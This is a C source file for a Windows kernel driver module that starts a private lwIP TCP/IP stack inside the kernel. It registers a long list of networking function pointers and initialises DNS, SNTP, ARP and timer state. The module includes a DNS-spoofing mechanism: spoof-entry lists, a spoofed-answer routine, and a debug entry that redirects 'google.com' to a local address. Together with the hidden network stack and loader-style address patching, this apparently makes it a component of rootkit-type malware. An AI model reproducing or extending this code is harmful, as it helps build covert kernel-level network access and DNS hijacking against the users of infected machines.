#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../mod_shared/headers.h"

#include "mod_tcpip.c"
#include "mod_tcpipApi.c"

NTSTATUS mod_tcpipEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_tcpip_block_t pTcpipBlock;
    pmod_header_t pModHeader = (pmod_header_t)modBase;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pTcpipBlock, sizeof(mod_tcpip_block_t), NonPagedPool);
    pGlobalBlock->pTcpipBlock = pTcpipBlock;
    pTcpipBlock->pModBase = (uint8_t*)modBase;

#ifndef _SOLID_DRIVER

#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value
        ((PUINT8)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((PUINT8)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_mbox_new);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_mbox_trypost);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_add);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_default);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_up);

#if LWIP_UDP
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_new);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_bind);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_connect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_sendto);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_new_port);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_sendto_if);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_send);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_disconnect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, udp_remove);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, recv_udp);
#endif // LWIP_UDP

#if LWIP_SNTP
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sntp_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sntp_request);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_get_ntp_time);
#endif // LWIP_SNTP

#if LWIP_DNS
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_setserver);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_gethostbyname);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_enqueue);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_lookup);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_send);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_check_entry);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_parse_name);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_timer);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_tmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_check_entries);

    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_gethostbyname);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_gethostbyname);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_dns_found);

#if DNS_DOES_NAME_CHECK
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_compare_name);
#endif // DNS_DOES_NAME_CHECK

#endif // LWIP_DNS

    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_addr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_remove);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_down);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_gw);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_ipaddr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netif_set_netmask);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_connect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_write_partly);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_close);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_shutdown);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_close_shutdown);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_delete);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_recv_data);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_new_with_proto_and_callback);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netbuf_delete);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_alloc);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_copy_partial);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_cat);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_chain);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_clen);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_copy);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_free_int);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_get_at);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_header);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_memcmp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_memfind);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_realloc);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_ref);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ethernetif_init);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_timeout);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_sem_new);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_sem_set_invalid);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_arch_sem_wait);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_thread);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_callback_with_block);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_apimsg);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_connect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_newconn);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_write);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_delconn);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_disconnect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_send);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_close);
    
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pcb_new);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, mem_malloc);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, mem_free);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, mem_trim);n
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, inet_chksum);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_standard_chksum);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, inet_cksum_pseudo_base);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, inet_chksum_pseudo);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, inet_cksum_pseudo_partial_base);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, inet_chksum_pseudo_partial);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_output);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_output_if);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_route);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip4_addr_isbroadcast);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip4_addr_netmask_valid);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ipaddr_addr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ipaddr_aton);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ipaddr_ntoa);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ipaddr_ntoa_r);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, plug_holes);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, queue_create);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, queue_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, queue_pop);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, queue_push);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_arch_mbox_fetch);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_mbox_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_mbox_set_invalid);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_mbox_valid);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_sem_signal);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_sem_valid);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_timeouts_mbox_fetch);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_recved);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_update_rcv_ann_wnd);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_output);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_abort);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_writemore);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_drain);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_close_internal);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, lwip_netconn_do_connected);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, netconn_alloc);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, raw_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_abandon);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_alloc);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_send_empty_ack);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_rexmit);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_rexmit_rto);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_rexmit_fast);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_tmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_slowtmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_fasttmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_segs_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_process_refused_data);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_seg_free);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_timewait_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_process);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_parseopt);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_rst_impl);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_receive);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_pcb_purge);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_seg_copy);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_enqueue_flags);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_write_checks);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_create_segment);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_output_alloc_header);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_output_segment);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_send_fin);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_pbuf_prealloc);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_write);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_zero_window_probe);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_keepalive);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_pcb_remove);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_next_iss);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_new_port);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_connect);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_close);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_close_shutdown);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_shutdown);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_kill_timewait);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_kill_prio);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_oos_insert_segment);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, raw_new);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, raw_remove);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, raw_sendto);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_tcp_timer);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_timer_needed); // empty function
#if LWIP_ARP
    DECLARE_GLOBAL_FUNC(pTcpipBlock, arp_timer);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_tmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_free_entry);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_arp_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_update_arp_entry);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_output_to_arp_index);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_send_ip);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_request);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_raw);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_query);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_find_entry);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, free_etharp_q);
#endif .. LWIP_ARP
    DECLARE_GLOBAL_FUNC(pTcpipBlock, etharp_output);

#if IP_REASSEMBLY
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_timer);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_tmr);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_free_complete_datagram);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_dequeue_datagram);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_remove_oldest_datagram);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_enqueue_new_datagram);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_reass_chain_frag_into_datagram_and_validate);
#endif // IP_REASSEMBLY
#if LWIP_TCP && TCP_QUEUE_OOSEQ && PBUF_POOL_FREE_OOSEQ
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_free_ooseq);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_pool_is_empty);
#endif // LWIP_TCP && TCP_QUEUE_OOSEQ && PBUF_POOL_FREE_OOSEQ
#if IP_FRAG
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_frag_free_pbuf_custom_ref);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, pbuf_alloced_custom);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ipfrag_free_pbuf_custom);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_frag);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ip_frag_alloc_pbuf_custom_ref);
#endif
    DECLARE_GLOBAL_FUNC(pTcpipBlock, ethernet_input);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sys_untimeout);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, poll_tcp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, recv_tcp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, sent_tcp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, err_tcp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, setup_tcp);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_arg);
//    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_accept);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_recv);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_sent);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_poll);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_err);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_new);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_recv_null);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcp_eff_send_mss_impl);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_send);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_receive);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_network_metrics_detector);

    // Интерфейсные функции
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_start_thread);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_reinit_stack_for_adapter);

    DECLARE_GLOBAL_FUNC(pTcpipBlock, match_pattern);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, dns_expand);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_dns_spoofed_a);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_udp_decoder);

    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_remove_all_dnss_entries);
    DECLARE_GLOBAL_FUNC(pTcpipBlock, tcpip_add_or_modify_dnss_entry);

    {
        int i;

        i = 0;
//        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct raw_pcb));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct udp_pcb));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct tcp_pcb));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct tcp_seg));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct ip_reassdata));
#if IP_FRAG
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct pbuf_custom_ref));
#endif
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct netbuf));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct netconn));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct tcpip_msg));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct tcpip_msg));
#if ARP_QUEUEING
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct etharp_q_entry));
#endif // ARP_QUEUEING
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(struct sys_timeo));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(MEMP_ALIGN_SIZE(sizeof(struct pbuf)) + MEMP_ALIGN_SIZE(0));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(MEMP_ALIGN_SIZE(sizeof(struct pbuf)) + MEMP_ALIGN_SIZE(PBUF_POOL_BUFSIZE));
        pTcpipBlock->memp_sizes[i++] = LWIP_MEM_ALIGN_SIZE(sizeof(queue_node_t));

        // = { 1, 2, 3, 4, 5, 6, 7, 7, 7, 7, 7, 7, 7};
        MEMSET(pTcpipBlock->tcp_backoff, 7, 13);
        for (i = 0; i < 6; i++) 
            pTcpipBlock->tcp_backoff[i] = i + 1;
     
        /* Times per slowtmr hits */
        pTcpipBlock->tcp_persist_backoff[0] = 3;// = { 3, 6, 12, 24, 48, 96, 120 };
        pTcpipBlock->tcp_persist_backoff[1] = 6;
        pTcpipBlock->tcp_persist_backoff[2] = 12;
        pTcpipBlock->tcp_persist_backoff[3] = 24;
        pTcpipBlock->tcp_persist_backoff[4] = 48;
        pTcpipBlock->tcp_persist_backoff[5] = 96;
        pTcpipBlock->tcp_persist_backoff[6] = 120;
#if 0
        pTcpipBlock->tcp_pcb_lists[0] = &pTcpipBlock->tcp_listen_pcbs.pcbs;
        pTcpipBlock->tcp_pcb_lists[1] = &pTcpipBlock->tcp_bound_pcbs;
#endif // #if 0
        pTcpipBlock->tcp_pcb_lists[0/*2*/] = &pTcpipBlock->tcp_active_pcbs;
        pTcpipBlock->tcp_pcb_lists[1/*3*/] = &pTcpipBlock->tcp_tw_pcbs;
    /** An array with all (non-temporary) PCB lists, mainly used for smaller code size */
    //struct tcp_pcb** tcp_pcb_lists[4];// = {&tcp_listen_pcbs.pcbs, &tcp_bound_pcbs, &tcp_active_pcbs, &tcp_tw_pcbs};

        pTcpipBlock->iss = 6510;

        pTcpipBlock->ip_addr_any.addr = IPADDR_ANY;
        pTcpipBlock->ip_addr_broadcast.addr = IPADDR_BROADCAST;

        MEMSET(&pTcpipBlock->ethbroadcast, 0xFF, 6); // = {{0xff,0xff,0xff,0xff,0xff,0xff}};
        
//        pTcpipBlock->static_port = /*TCP_LOCAL_PORT_RANGE_START */4096;

        /* last local UDP port */
        pTcpipBlock->udp_port = UDP_LOCAL_PORT_RANGE_START;
        pTcpipBlock->tcp_port = TCP_LOCAL_PORT_RANGE_START;



#ifdef _WIN64
        pTcpipBlock->spinLock = 0;
#else
        pCommonBlock->fnKeInitializeSpinLock(&pTcpipBlock->spinLock);
#endif

        pTcpipBlock->netif_num = 0;
        pTcpipBlock->netif_default = NULL;


//         // DNS spoofer
//         pCommonBlock->fncommon_strcpy_s(pTcpipBlock->domainName, sizeof(pTcpipBlock->domainName), "maria.com"); 
//         // DNS spoofer
    }
    
    pTcpipBlock->dns_payload = (uint8_t *)LWIP_MEM_ALIGN(pTcpipBlock->dns_payload_buffer);

#if LWIP_RANDOMIZE_INITIAL_LOCAL_PORTS && defined(LWIP_RAND)
    pTcpipBlock->tcp_port = TCP_ENSURE_LOCAL_PORT_RANGE(LWIP_RAND());
#endif /* LWIP_RANDOMIZE_INITIAL_LOCAL_PORTS && defined(LWIP_RAND) */

#if LWIP_UDP
#if LWIP_RANDOMIZE_INITIAL_LOCAL_PORTS && defined(LWIP_RAND)
        pGlobalBlock->pTcpipBlock->udp_port = UDP_ENSURE_LOCAL_PORT_RANGE(LWIP_RAND());
#endif /* LWIP_RANDOMIZE_INITIAL_LOCAL_PORTS && defined(LWIP_RAND) */
#endif // LWIP_UDP

#if LWIP_DNS
    // Инициализируем DNS-клиент.
    pTcpipBlock->dns_pcb = pTcpipBlock->fnudp_new();

    if (pTcpipBlock->dns_pcb != NULL) {
      pTcpipBlock->fnudp_bind(pTcpipBlock->dns_pcb, IP_ADDR_ANY, 0);
      pTcpipBlock->fnudp_recv(pTcpipBlock->dns_pcb, pTcpipBlock->fndns_recv, NULL);
    }
#endif // LWIP_DNS

    pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)&pTcpipBlock->dnsSpoofHead);
#if DBG
    {
        pdns_spoof_entry_t pDnsEntry;
        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pDnsEntry, sizeof(dns_spoof_entry_t) + 10, NonPagedPool);
        pDnsEntry->type = ns_t_a;
        pDnsEntry->ipAddr = 0xC0A88901;
        pCommonBlock->fncommon_strcpy_s(pDnsEntry->name, 11, "google.com");
        pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)&pTcpipBlock->dnsSpoofHead, (PLIST_ENTRY)pDnsEntry);
    }
    
#endif // DBG
//     {
//         uint8_t* ptr;
// 
//     }

#if LWIP_SNTP
    // Инициализируем SNTP-клиент.
    pTcpipBlock->sntp_pcb = pTcpipBlock->fnudp_new();
    if (pTcpipBlock->sntp_pcb != NULL) {
        pTcpipBlock->fnudp_recv(pTcpipBlock->sntp_pcb, pTcpipBlock->fnsntp_recv, NULL);
        //pTcpipBlock->fnsntp_request(NULL);
    }
#endif // LWIP_SNTP

//    sys_timeouts_init();
#if IP_REASSEMBLY
    pTcpipBlock->fnsys_timeout(IP_TMR_INTERVAL, pTcpipBlock->fnip_reass_timer, NULL);
#endif /* IP_REASSEMBLY */
#if LWIP_ARP
    pTcpipBlock->fnsys_timeout(ARP_TMR_INTERVAL, pTcpipBlock->fnarp_timer, NULL);
#endif /* LWIP_ARP */
#if LWIP_DNS
    pTcpipBlock->fnsys_timeout(DNS_TMR_INTERVAL, pTcpipBlock->fndns_timer, NULL);
#endif /* LWIP_DNS */

    pTcpipBlock->fnsys_mbox_new((sys_mbox_t*)&pTcpipBlock->mbox, TCPIP_MBOX_SIZE);

    pTcpipBlock->tcpipThreadMustBeStopped = TRUE;

    return STATUS_SUCCESS;
}
